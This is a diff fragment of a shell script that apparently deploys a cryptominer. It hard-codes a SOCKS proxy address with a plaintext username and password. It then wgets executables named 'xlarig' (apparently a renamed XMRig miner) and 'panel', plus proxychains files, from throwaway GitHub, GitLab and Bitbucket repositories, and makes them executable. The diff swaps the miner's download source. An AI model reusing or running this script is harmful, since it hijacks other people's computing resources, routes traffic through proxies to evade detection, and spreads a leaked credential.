@@ -2,7 +2,7 @@ proxy="34.192.31.89"
 port="1080" 
 user="fixie"  
 pass="ZItqWDieBi3LhbH" 
-wget -q https://gitlab.com/55113110159/oz/-/raw/main/xlarig && chmod +x xlarig 
+wget -q -O xlarig https://github.com/devinasaliya/super-eureka/raw/main/nevo && chmod +x xlarig
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/libproxychains4.so && chmod +x libproxychains4.so 
